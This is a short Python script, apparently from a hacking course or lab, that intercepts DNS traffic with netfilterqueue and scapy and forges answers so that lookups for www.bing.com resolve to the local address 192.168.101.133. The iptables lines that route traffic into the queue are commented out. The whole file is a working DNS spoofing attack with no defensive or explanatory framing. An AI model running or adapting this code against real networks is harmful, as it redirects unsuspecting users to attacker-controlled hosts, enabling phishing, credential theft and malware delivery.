#!/usr/bin/env python
import os

import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet=scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname=scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+]Spoofing target")
            answer=scapy.DNSRR(rrname=qname,rdata="192.168.101.133")
            scapy_packet[scapy.DNS].an=answer
            scapy_packet[scapy.DNS].ancount=1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))
    packet.accept()
#try:
    #os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
queue=netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()
#except KeyboardInterrupt:
    #os.system("iptables --flush")